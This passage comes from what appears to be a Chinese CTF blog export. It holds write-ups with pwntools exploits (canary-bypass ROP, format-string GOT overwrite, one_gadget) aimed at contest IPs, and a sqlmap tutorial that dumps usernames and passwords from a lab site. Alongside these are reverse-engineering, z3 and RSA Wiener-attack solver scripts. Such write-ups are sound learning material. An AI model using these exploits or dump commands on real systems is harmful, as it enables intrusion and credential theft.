add_mail(3,'agx','aaaaa',0x30,'aaaaaaaaaa') edit_mail(3,'aaaaaa','bbbbbb','a'*16+'b'*16+p64(environ)+p64(0x200)) show_mail(0) p.recvuntil('context is: ') stack = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) log.info('stack==&gt;'+hex(stack)) edit_mail(3,'aaaaaa','bbbbbb','a'*16+'b'*16+p64(stack-272)+p64(0x200)) edit_mail(0,'ccc','dddd',p64(one_gadget)) #gdb.attach(p) log.info('one_gadget==&gt;'+hex(one_gadget)) p.sendlineafter('your choice:\\n','5') p.interactive()if __name__ == \"__main__\": main() safe_vpn这道题应该是一道非预期，由于文件指针在读取完之后会指向文件尾，再次读取就会读取到空字符，在该程序中，文件指针没有刷新，因此，我们在读取一次文件后，只要再输入两个空字符就可以获取shell #!/usr/bin/python#coding=utf-8from pwn import *context.terminal = ['gnome-terminal','-x','sh','-c']context.binary = './vpn'if args['REMOTE']: p = remote('219.219.61.234','20007')else: p = process('./vpn')context.log_level = 'debug'elf = ELF('./vpn')p.recvuntil('input your user name\\n')p.send('a'*0x100)p.sendafter('input your password\\n','b'*0x100)p.recvuntil('input your user name\\n')p.send('\\x00')p.sendafter('input your password\\n','\\x00')p.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"简单的SQL注入","slug":"sql注入---sqlmap简单操作","date":"2020-10-14T09:06:19.214Z","updated":"2020-10-14T09:10:40.986Z","comments":true,"path":"2020/10/14/sql注入---sqlmap简单操作/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/10/14/sql%E6%B3%A8%E5%85%A5---sqlmap%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/","excerpt":"sql注入—sqlmap简单操作","text":"sql注入—sqlmap简单操作 0x01 sqlmap是什么sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点： 完全支持MySQL、Oracle、PostgreSQL、Microsoft SQLServer、Microsoft Acess、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和informix等多种数据库管理系统。 完全支持布尔型盲注、时间盲注、基于错误信息的注入、联合查询注入和堆查询注入。 在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列 支持自动识别密码哈希格式并通过字典破解密码哈希 支持完全下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载一列中的部分数据，这完全取决于用户的选择。 支持在数据库管理系统中搜集指定的数据库名、表名或列名 当数据库管理系统是MySQL、PostgreSQL或Microsofe SQLServer时支持下载或上传文件 当数据库管理系统是MySQL、PostgreSQL或Microsofe SQLServer时执行任意命令并回显标准输出 0x02 简单的sql注入 1. SQL注入是什么 通过SQL命令插入到Web表单提交或输入域名或页面请求的查询字符，最终达到欺骗服务器执行恶意的SQL命令。其主要原因时程序没有细致地过滤用户输入的数据，导致非法数据侵入系统。 2.使用sqlmap进行简单注入操作测地址试：http://106.12.198.186/Less-1/?id=1 具体步骤： 查看是否存在sql注入 sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; 获取数据库信息 sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs available databases有5个 列出当前应用使用的数据库 sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db 现在我们拿到了所使用的库为security，然后由此拿到库中的表名 sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables 很容易想到用户信息应该都存放在users表中，因此获取users中表字段名称 sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns 攻击者感兴趣的一定是user和password字段，下一步就是dump他们 (dump 转存数据库数据) sqlmap -u &quot;http:&#x2F;&#x2F;106.12.198.186&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C username,password --dump 可以看到，sqlmap猜解除了所有的用户名和密码，至此完成了此次sql注入！ 我们把数据打印出来","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Web/"}],"author":"H1un"},{"title":"校赛 WriteUp","slug":"校赛","date":"2020-09-25T11:54:42.867Z","updated":"2020-09-29T13:59:58.513Z","comments":true,"path":"2020/09/25/校赛/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/","excerpt":"校赛 WP","text":"校赛 WP re1 签到啊啊啊网站给关了，题目还找不到 这题应该是拖入ida，直接shift+f12就好了 懂得都懂 re2 字节码python字节码 这打开网站看逻辑写py脚本 a=[80,70,94,71,85,71,85,104 ,86 ,39 ,64 ,106 ,76,67,106,71 ,123 ,92 ,125 ,76 ,37 ,106 ,103 ,118 ,80 ,35 ,119 ,32 ,110]d=''for i in a: d+=chr(i ^ 19) print(t) re3 upxupx脱壳 放入kali upx -d 再拖入ida shift+f12 懂得都懂 re4 easy c++拖入ida ，那个std::string::operation[]函数，一开始识别的参数个数是错误的，需要点进去，发现它需要3个参数再返回，IDA会重新分析，然后大概逻辑就能看懂了，附上脚本 s1 = r'eMl1_l1hT9_ldcoR3OC1CW0HhC_&#123;UF30Tp__l&#125;'sw = [0x15,0x2,0xA,0x16,0x13,0xB,0x11,0x8,0x3,0x1B,0x19,0x21,0x12,0x1A,0x18,0x10,0x9,0x22,0x24,0x17,0x4,0xE,0xC,0x14,0x1E,0x0,0x1D,0x7,0x1,0x6,0x1F,0xF,0x5,0x1C,0xD,0x23,0x20,0x25]s1a = [0 for i in range(38)]for i in range(38): s1a[sw[i]]=s1[i]print(s1a)flag = ''for i in s1a: flag+=iprint(flag) re实在太菜了，只做了四道题还是一堆签到题，low的不谈。 cry1 幼儿园密码import gmpy2p=324350545929838254331191385863847627003q=328413456989577256301798468872388310877e = 0x10001fai_n=(p-1)*(q-1)print(fai_n)d=gmpy2.invert(e,fai_n)print(\"d的十六进制值为：\")print(d)import mathn = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fc = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dm=pow(c,d,n)print(hex(m))print(bytes.fromhex(hex(m)[2:])) cry2 小学生读python代码 理解其中意思即可 设a=2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841 根据代码 dic = [chr(i) for i in range(ord(“A”), ord(“}”) + 1)] 懂得都懂了 照着原代码写就可以了 a =\"2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841\"dic = [chr(i) for i in range(ord(\"A\"), ord(\"&#125;\") + 1)]flag = []s = 0for i in range(len(a)): if(a[i] != '0'): if(a[i] == '8'): s = s + 8 if(a[i] == '4'): s = s + 4 if(a[i] == '2'): s = s + 2 if(a[i] == '1'): s = s + 1 elif(a[i] == '0'): flag.append(s) s = 0x = ''for i in flag: x += dic[i-1]print(x) cry3 初中生根据题意 和下面已知的数可知，x=-3052……这个大数 我们求得p=-2764……..这个大数。phi=(p-1)*(q-1)=pq-(p+q)+1，构造p+q，所以 (p+q)^2=(p-q)^2+4pq即可求得p+q。q=p+x,n=p×q phi=(p+1)×(q+1) 上脚本 import gmpy2x=-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636p=-27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221q=p+xn=p*qphi=(p+1)*(q+1)e=65537c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609d=gmpy2.invert(e,phi)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) cry4 维也纳wienerAttack 之前做过类似的题，网上搜到攻击脚本 import gmpy2def transform(x,y): res=[] while y: res.append(x//y) x,y=y,x%y return resdef continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: denominator,numerator=numerator,i*numerator+denominator return denominator,numeratordef sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) return resdef get_pq(a,b,c): par=gmpy2.isqrt(b*b-4*a*c) x1,x2=(-b+par)//(2*a),(-b-par)//(2*a) return x1,x2def wienerAttack(e,n): for (d,k) in sub_fraction(e,n): if k==0: continue if (e*d-1)%k!=0: continue phi=(e*d-1)//k px,qy=get_pq(1,n-phi+1,n) if px*qy==n: p,q=abs(int(px)),abs(int(qy)) d=gmpy2.invert(e,(p-1)*(q-1)) return d print(\"Attack\")e= 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193n= 106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819d=wienerAttack(e,n)print(\"d=\",d) 求出d=4001432317734070407477987975822419567810029780079645936018270575239527395536789310438299826077199193614373011908550209898633418531766102444584737312758497 我们想要得到的是m 那么已知c，d，n，那m不就出来了吗 import gmpy2d=4001432317734070407477987975822419567810029780079645936018270575239527395536789310438299826077199193614373011908550209898633418531766102444584737312758497e= 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193n= 106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) misc 1 连签到都算不上一串base64 提示是一张图片 在线转出二维码 扫一下发现是社会主义核心价值观编码 66666666 misc 2 真·签到题图片题，这不是我舍友头像嘛，真low，拖入winhex里，在最后面发现可疑的base64，在线转码发现是凯撒密码，ok misc 3 能看到我吗拖入winhex，是个zip，改后缀名，解压爆破，得到图片，foremost分离出来。。。 misc 4 别做题了听歌吧MP3Stego 用cmd打开 百度得到的一条指令 密码是cumt 得到一个aoheqiao.txt 用010 editor打开，发现是摩斯密码，09，20表示.或- od oa表示回车和换行，在线莫斯密码转码得到flag pwn1 test_nclinux下nc！666666666666 pwn2 babystackfrom pwn import *p=remote('202.119.201.197',10002)payload='1_love_y0u'p.sendline(payload)p.interactive() low的不谈 pwn3 canary 来看看havefun函数 read函数存在溢出，绕过canary。溢出点有puts输出 ，而buf内存是40h，那么偏移就是0x40-0x8=56.再读取8就可以得到canary。 from pwn import *context.log_level = \"debug\"# r=process('./canary')r =remote('202.119.201.197',10004)r.recvuntil(\"Let's pwn it!\")r.sendline(b'a'*(56))r.recvuntil(\"a\"*56)canary=u64(r.recv(8))-0xaprint (\"canary=&gt;\" +hex(canary))r.sendline(b'a'*56+p64(canary)+b'a'*8+p64(0x00000000004008e3)+p64(0x0000000000400904)+p64(0x4005F0))r.recv()r.interactive() pwn 4 fmstrfrom pwn import *context.log_level = \"debug\"# r=process('./fmstr')r = remote(\"202.119.201.197\",10006)putsgot = 0x804a014sysaddr = 0x0804857dgetsaddr = 0x804a014retaddr = 0x08048604r.recvuntil(\"what's your name:\")r.sendline(fmtstr_payload(8, &#123;getsaddr: sysaddr&#125;))r.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"第十三届全国大学生信息安全竞赛 WriteUp","slug":"第十三届全国大学生信息安全竞赛 WriteUp","date":"2020-08-20T12:33:49.145Z","updated":"2020-09-03T06:27:18.675Z","comments":true,"path":"2020/08/20/第十三届全国大学生信息安全竞赛 WriteUp/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/08/20/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20WriteUp/","excerpt":"国赛 WP","text":"国赛 WP 0x01 签到flag{同舟共济扬帆起，乘风破浪万里航。} 0x02 the_best_ctf_game拖入winhex中查看 注意观察得到flag！ 0x03 z3无壳，拖入IDA中查看，反编译得到代码！ 分析得到，Dst为int型，在&amp;unk_404020查看数据 编写长长的脚本如下： from z3 import *v4 = [0x4f17,0x9cf6,0x8ddb,0x8ea6,0x6929,0x9911,0x40a2,0x2f3e,0x62b6,0x4b82,0x486c,0x4002,0x52d7,0x2def,0x28dc,0x640d,0x528f,0x613b,0x4781,0x6b17,0x3237,0x2a93,0x615f,0x50be,0x598e,0x4656,0x5b31,0x313a,0x3010,0x67fe,0x4d5f,0x58db,0x3799,0x60a0,0x2750,0x3759,0x8953,0x7122,0x81f9,0x5524,0x8971,0x3a1d]print(len(v4))v46 = Int('v46')v47 = Int('v47')v48 = Int('v48')v49 = Int('v49')v50 = Int('v50')v51 = Int('v51')v52 = Int('v52')v53 = Int('v53')v54 = Int('v54')v55 = Int('v55')v56 = Int('v56')v57 = Int('v57')v58 = Int('v58')v59 = Int('v59')v60 = Int('v60')v61 = Int('v61')v62 = Int('v62')v63 = Int('v63')v64 = Int('v64')v65 = Int('v65')v66 = Int('v66')v67 = Int('v67')v68 = Int('v68')v69 = Int('v69')v70 = Int('v70')v71 = Int('v71')v72 = Int('v72')v73 = Int('v73')v74 = Int('v74')v75 = Int('v75')v76 = Int('v76')v77 = Int('v77')v78 = Int('v78')v79 = Int('v79')v80 = Int('v80')v81 = Int('v81')v82 = Int('v82')v83 = Int('v83')v84 = Int('v84')v85 = Int('v85')v86 = Int('v86')v87 = Int('v87')s = Solver()s.add(v4[0] == 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52)s.add(v4[1] == 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52)s.add(v4[2] == 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52)s.add(v4[3] == 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52)s.add(v4[4] == 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52)s.add(v4[5] == 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52)s.add(v4[6] == 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52)s.add(v4[7] == 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59)s.add(v4[8] == 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59)s.add(v4[9] == 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59)s.add(v4[10] == 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59)s.add(v4[11] == 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59)s.add(v4[12] == 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59)s.add(v4[13] == 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59)s.add(v4[14] == 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66)s.add(v4[15] == 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66)s.add(v4[16] == 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66)s.add(v4[17] == 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66)s.add(v4[18] == 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66)s.add(v4[19] == 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66)s.add(v4[20] == 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66)s.add(v4[21] == 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73)s.add(v4[22] == 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73)s.add(v4[23] == 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73)s.add(v4[24] == 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73)s.add(v4[25] == 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73)s.add(v4[26] == 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73)s.add(v4[27] == 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73)s.add(v4[28] == 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80)s.add(v4[29] == 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80)s.add(v4[30] == 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80)s.add(v4[31] == 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80)s.add(v4[32] == 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80)s.add(v4[33] == 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80)s.add(v4[34] == 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80)s.add(v4[35] == 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87)s.add(v4[36] == 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87)s.add(v4[37] == 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87)s.add(v4[38] == 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87)s.add(v4[39] == 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87)s.add(v4[40] == 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87)s.add(v4[41] == 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87)print(s.check())print(s.model()) 得到数据经过排序和16进制转化得到flag！ 0x04 电脑被黑Linux命令行调试得到一个flag.txt和一个demo文件 拖入IDA中查看，反编译文件，看逻辑是一个简单的加密。 image-20200821121818907 加密代码就简单几行，分析得到flag.txt为密文 编写简单脚本就得到flag file=open('flag.txt','rb') f=file.read() v4=34 v5=0 flag=\"\" for i in f: flag=flag+chr((ord(i)^v4)-v5) v4=(v4+34)&amp;0xff v5=(v5+2)&amp;0xf #print flag,v4,v5 print flag flag{e5d7c4ed-b8f6-4417-8317-b809fc26c047} 0x05 bd一道RSA题，题目提示是Wiener‘s attack 直接上脚本 import gmpy2def transform(x,y): #使用辗转相处将分数 x/y 转为连分数的形式 res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #从sublist的后面往前循环 denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #得到渐进分数的分母和分子，并返回 #求解每个渐进分数def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #将连分数的结果逐一截取以求渐进分数 return resdef get_pq(a,b,c): #由p+q和pq的值通过维达定理来求解p和q par=gmpy2.isqrt(b*b-4*a*c) #由上述可得，开根号一定是整数，因为有解 x1,x2=(-b+par)//(2*a),(-b-par)//(2*a) return x1,x2def wienerAttack(e,n): for (d,k) in sub_fraction(e,n): #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数 if k==0: #可能会出现连分数的第一个为0的情况，排除 continue if (e*d-1)%k!=0: #ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n) continue phi=(e*d-1)//k #这个结果就是 φ(n) px,qy=get_pq(1,n-phi+1,n) if px*qy==n: p,q=abs(int(px)),abs(int(qy)) #可能会得到两个负数，负负得正未尝不会出现 d=gmpy2.invert(e,(p-1)*(q-1)) #求ed=1 (mod φ(n))的结果，也就是e关于 φ(n)的乘法逆元d return d print(\"该方法不适用\") e =46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249n =86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289d=wienerAttack(e,n)print(\"d=\",d) 算出d= 1485313191830359055093545745451584299495272920840463008756233 然后编写第二个脚本求m import gmpy2d= 1485313191830359055093545745451584299495272920840463008756233c = 37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066n = 86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289m = pow(c,d,n)print(hex(m)) m=0x666c61677b64333735323533382d393064302d633337332d636665662d3932343764336531363834387d 经过16进制转化 flag{d3752538-90d0-c373-cfef-9247d3e16848}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"攻防世界_RESERVE_新手(2)","slug":"攻防世界_RESERVE_新手(2)","date":"2020-07-21T09:39:27.744Z","updated":"2021-01-11T01:41:46.226Z","comments":true,"path":"2020/07/21/攻防世界_RESERVE_新手(2)/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_RESERVE_%E6%96%B0%E6%89%8B(2)/","excerpt":"XCTF-RE","text":"XCTF-RE 前言放假两天了，在家实在闲的太无聊了，把攻防世界新手区的博客给水完吧。啥也不说，直接上题！ 0x01 Hello, CTF 32位exe文件，直接暴力拖入IDA 32-bit中，暴力F5查看关键代码如下 strcpy(&amp;v13, \"437261636b4d654a757374466f7246756e\"); while ( 1 ) &#123; memset(&amp;v10, 0, 0x20u); //v10字符串初始化 v11 = 0; v12 = 0; sub_40134B(aPleaseInputYou, v6); scanf(aS, v9); if ( strlen(v9) &gt; 0x11 ) break; v3 = 0; do &#123; v4 = v9[v3]; if ( !v4 ) break; sprintf(&amp;v8, asc_408044, v4); strcat(&amp;v10, &amp;v8); ++v3; &#125; while ( v3 &lt; 17 ); if ( !strcmp(&amp;v10, &amp;v13) ) //如果v10=v13 则输出success sub_40134B(aSuccess, v7); else sub_40134B(aWrong, v7); //否则输出wrong &#125; sub_40134B(aWrong, v7); result = stru_408090._cnt-- - 1; if ( stru_408090._cnt &lt; 0 ) return _filbuf(&amp;stru_408090); ++stru_408090._ptr; return result;&#125; 这里我们看到，当v10和v13相等时，会返回success ，接下来要分析的就是v10是怎么来的，通过上面的代码可以知道v10是通过将输入的字符串以十六进制读取而成的 那么，我们将v13转换成10进制（两位一转），再通过Ascll码变成字符，就可以得到正确的结果，编写脚本如下： a = [0x43,0x72,0x61,0x63,0x6b,0x4d,0x65,0x4a,0x75,0x73,0x74,0x46,0x6f,0x72,0x46,0x75,0x6e]c = \"\"for x in a: c += chr(x)print(c) 得到flag{CrackMeJustForFun} 0x02 getitIDA静态分析，F5查看关键代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v3; // al __int64 v5; // [rsp+0h] [rbp-40h] int i; // [rsp+4h] [rbp-3Ch] FILE *stream; // [rsp+8h] [rbp-38h] char filename[8]; // [rsp+10h] [rbp-30h] unsigned __int64 v9; // [rsp+28h] [rbp-18h] v9 = __readfsqword(0x28u); LODWORD(v5) = 0; while ( (signed int)v5 &lt; strlen(s) ) // s=c61b68366edeb7bdce3c6820314b7498 &#123; if ( v5 &amp; 1 ) v3 = 1; else v3 = -1; *(&amp;t + (signed int)v5 + 10) = s[(signed int)v5] + v3; //t=53h+harifCTF&#123;????????????????????????????????&#125; LODWORD(v5) = v5 + 1; &#125; strcpy(filename, \"/tmp/flag.txt\"); stream = fopen(filename, \"w\"); fprintf(stream, \"%s\\n\", u, v5); for ( i = 0; i &lt; strlen(&amp;t); ++i ) &#123; fseek(stream, p[i], 0); fputc(*(&amp;t + p[i]), stream); fseek(stream, 0LL, 0); fprintf(stream, \"%s\\n\", u); &#125; fclose(stream); remove(filename); return 0;&#125; s = ‘c61b68366edeb7bdce3c6820314b7498’t = [‘S’,’h’,’a’,’r’,’i’,’f’,’C’,’T’,’F’,’{‘,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’?’,’}’] 编写不同语言脚本如下 v5 = 0 //pythons = 'c61b68366edeb7bdce3c6820314b7498't = ['S','h','a','r','i','f','C','T','F','&#123;','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','?','&#125;']v3 = 0l = len(s)while(v5 &lt; l): if( v5 &amp; 1 ): v3 = 1 else: v3 = -1 t[10+v5] = chr(ord(s[v5])+v3) v5 += 1c = ''for x in 